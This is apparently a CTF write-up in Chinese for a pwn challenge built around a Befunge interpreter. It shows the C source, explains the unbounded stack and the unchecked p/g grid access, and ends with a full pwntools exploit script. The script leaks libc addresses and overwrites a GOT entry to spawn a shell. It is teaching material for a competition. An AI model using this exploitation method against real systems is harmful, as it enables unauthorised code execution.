---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# go?

一个 befunge 解释器，内置了一小段代码

### 源码

```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <ctype.h>

#define WIDTH 80
#define HEIGHT 25
#define STACK_INIT_CAP 1024

typedef enum {
    DIR_RIGHT,
    DIR_LEFT,
    DIR_UP,
    DIR_DOWN
} Direction;

void init()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

long stack_arr[256];
char grid[HEIGHT][WIDTH];
int stack_size = 0;

void push(long v) {
    stack_arr[stack_size++] = v;
}

long pop_() {
    if (stack_size > 0) {
        return stack_arr[--stack_size];
    } else {
        return 0;
    }
}

void pop2(long *a, long *b) {
    *a = pop_();
    *b = pop_();
}

void interpret() {
    int x = 0, y = 0;
    Direction dir = DIR_RIGHT;
    int string_mode = 0;

    srand((unsigned)time(NULL));

    while (1) {
        char instr = grid[y][x];

        if (string_mode) {
            if (instr == '"') {
                string_mode = 0;
            } else {
                push((long)instr);
            }
        } else {
            if (isdigit((unsigned char)instr)) {
                push(instr - '0');
            } else {
                switch (instr) {
                case '+': {
                    long a, b;
                    pop2(&a, &b);
                    push(b + a);
                } break;
                case '-': {
                    long a, b;
                    pop2(&a, &b);
                    push(b - a);
                } break;
                case '*': {
                    long a, b;
                    pop2(&a, &b);
                    push(b * a);
                } break;
                case '/': {
                    long a, b;
                    pop2(&a, &b);
                    if (a == 0) push(0);
                    else push(b / a);
                } break;
                case '%': {
                    long a, b;
                    pop2(&a, &b);
                    if (a == 0) push(0);
                    else push(b % a);
                } break;
                case '!': {
                    long a = pop_();
                    push(a == 0 ? 1 : 0);
                } break;
                case '`': {
                    long a, b;
                    pop2(&a, &b);
                    push(b > a ? 1 : 0);
                } break;
                case '>': dir = DIR_RIGHT; break;
                case '<': dir = DIR_LEFT; break;
                case '^': dir = DIR_UP; break;
                case 'v': dir = DIR_DOWN; break;
                case '?': {
                    int r = rand() % 4;
                    dir = (Direction)r;
                } break;
                case '_': {
                    long a = pop_();
                    dir = (a == 0 ? DIR_RIGHT : DIR_LEFT);
                } break;
                case '|': {
                    long a = pop_();
                    dir = (a == 0 ? DIR_DOWN : DIR_UP);
                } break;
                case '"': {
                    string_mode = 1;
                } break;
                case ':': {
                    long a = pop_();
                    push(a);
                    push(a);
                } break;
                case '\\': {
                    long a = pop_();
                    long b = pop_();
                    push(a);
                    push(b);
                } break;
                case '$': {
                    pop_();
                } break;
                case '.': {
                    long a = pop_();
                    printf("%ld", a);
                } break;
                case ',': {
                    long a = pop_();
                    putchar((char)a);
                } break;
                case '#': {
                    switch (dir) {
                    case DIR_RIGHT: x = (x + 1) % WIDTH; break;
                    case DIR_LEFT: x = (x - 1 + WIDTH) % WIDTH; break;
                    case DIR_UP: y = (y - 1 + HEIGHT) % HEIGHT; break;
                    case DIR_DOWN: y = (y + 1) % HEIGHT; break;
                    }
                } break;
                case 'g': {
                    long y2 = pop_();
                    long x2 = pop_();
                    push((long)grid[y2][x2]);
                } break;
                case 'p': {
                    long x2 = pop_();
                    long y2 = pop_();
                    long v = pop_();
                    grid[y2][x2] = (char)v;
                } break;
                case '@': {
                    return;
                }
                case '&': {
                long v;
                if (scanf("%ld", &v) == 1) {
                    push(v);
                } else {
                    push(0);
                }
                } break;
                case '~': {
                    int c = getchar();
                    if (c == EOF) {
                        push(0);
                    } else {
                        push((long)c);
                    }
                } break;
                case ' ':
                    break;
                default:
                    break;
                }
            }
        }
        switch (dir) {
        case DIR_RIGHT: x = (x + 1) % WIDTH; break;
        case DIR_LEFT: x = (x - 1 + WIDTH) % WIDTH; break;
        case DIR_UP: y = (y - 1 + HEIGHT) % HEIGHT; break;
        case DIR_DOWN: y = (y + 1) % HEIGHT; break;
        }
    }
}

const char *demo_program[] = {
    "v       ,*25    <",
    "\"v       <    ",
    "\n>~:25* -|v < ",
    "t,          , ",
    "u,       >>:| ",
    "p,          >   ^",
    "n,  ",
    "i,",
    "\",",
    ">^",
    NULL
};

void load_demo_program() {
    for (int row = 0; demo_program[row] != NULL && row < HEIGHT; row++) {
        const char *line = demo_program[row];
        int len = 0;
        while (line[len] && len < WIDTH) len++;
        for (int col = 0; col < len; col++) {
            grid[row][col] = line[col];
        }
        for (int col = len; col < WIDTH; col++) {
            grid[row][col] = ' ';
        }
    }
    int start = 0;
    for (; demo_program[start] != NULL && start < HEIGHT; start++);
    for (int row = start; row < HEIGHT; row++) {
        for (int col = 0; col < WIDTH; col++) {
            grid[row][col] = ' ';
        }
    }
}

int main(int argc, char *argv[]) {
    init();
    load_demo_program();
    interpret();
    return 0;
}
```

### 题解

首先通过逆向还原出每个指令的意义，可以大概看出 `pc` 在一个二维数组上面运动，具有方向惯性，初始在 `(0, 0)` 的位置，方向为左。

文件自带的代码为

![Go 程序主逻辑](/assets/images/wp/2025/week5/go-question_1.png)

首先线下，遇到 `进入字符模式开始压栈，随后输出input>`。

进入一个循环，每次输入之后尝试复制字符检测是否为回车 `\x0a`，通过 `|` 进入分支判断。如果输入回车，则跳出输入循环进入输出，直到将栈上全部数据输出，随后重复。

![Go 结构体字段分析](/assets/images/wp/2025/week5/go-question_2.png)

通过观察可以发现栈的类型为qword而且没有上限检测，可以一直push造成溢出，只要不输入回车

同时p和g的自修改指令是没有范围限制的

![调试得到关键数据](/assets/images/wp/2025/week5/go-question_3.png)

可以发现stack是在map的低地址的，栈这里向高地址增长，可以覆盖正在执行的指令，但是输入时有一个 : 进行复制，可以选择覆盖第一行在输出结束时进行控制或者是覆盖第二行的v让具有惯性的指针在这一行循环

用&进行输入方便控制8个字节内的每一个指令

&&&g.&$$保持栈平衡到原来的位置方便修改，同时进行泄露

最后用p指令修改got表的rand函数为system，参数就是当前的指令位置写入sh

getshell

#### EXP

```python
from pwn import*
context.update(arch='amd64',os='linux',log_level='debug')
context.terminal=['qterminal','-e']
libc=ELF('./libc.so.6')
def pack(payload):
    return str(int.from_bytes(payload.ljust(8,b'\x00'),'little')).encode()+b'\n'

dd=0
if dd:
    p=process('./chal')
else:
    p=remote('127.0.0.1',9999)

payload=b'a'*0xff
payload+=b'&'
payload+=b'c'
payload+=b'>'
p.sendlineafter('input',payload)

payload=b'0\n'*0xff
p.send(payload)
#leak
sleep(1)
p.clean()
byte=[]
for i in range(6):
    payload=pack(b'&&&g.&$$')
    payload+=str(-2312+i).encode()+b'\n'
    payload+=b'0\n'
    p.send(payload)
    byte.append(p.recv(10,timeout=0.1))
    p.send(b'0\n')
    sleep(0.1)

nums = [int(x) for x in byte]
unsigned = [(x + 256) % 256 for x in nums]
addr_bytes = bytes(unsigned)
addr = int.from_bytes(addr_bytes[:8], 'little')
print("addr:"+hex(addr))
libc.address=addr-libc.sym['getchar']
print("libc:"+hex(libc.address))

byte=[]
p.clean()
for i in range(6):
    payload=pack(b'&&&g.&$$')
    payload+=str(-2280+i).encode()+b'\n'
    payload+=b'0\n'
    p.send(payload)
    byte.append(p.recv(10,timeout=0.1))
    p.send(b'0\n')
    sleep(0.1)

nums = [int(x) for x in byte]
unsigned = [(x + 256) % 256 for x in nums]
addr_bytes = bytes(unsigned)
addr = int.from_bytes(addr_bytes[:8], 'little')-0x10A6
print("base:"+hex(addr))
target=p64(libc.address+0xdd063)
#vyx

for i in range(6):
    payload=pack(b'&&&&p&$$')
    b=target[i]
    payload+=str(int.from_bytes(bytes([b]), 'little', signed=True)).encode()+b'\n'
    payload+=b'0\n'
    payload+=str(-2280+i).encode()+b'\n'
    p.send(payload)
    p.send(b'0\n')
payload=pack(b'&&&')
payload+=pack(b'?')
payload+=b'0\n'
p.send(payload)
#
p.interactive()
```
